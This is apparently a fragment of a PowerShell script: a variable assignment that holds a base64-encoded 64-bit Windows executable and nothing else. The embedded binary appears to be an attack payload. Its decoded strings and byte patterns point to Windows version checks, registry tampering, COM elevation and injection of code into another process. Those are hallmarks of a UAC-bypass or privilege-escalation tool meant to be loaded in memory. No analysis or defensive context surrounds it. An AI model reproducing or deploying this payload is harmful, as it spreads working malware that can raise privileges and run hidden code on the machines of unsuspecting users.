	$PEBytes64 = "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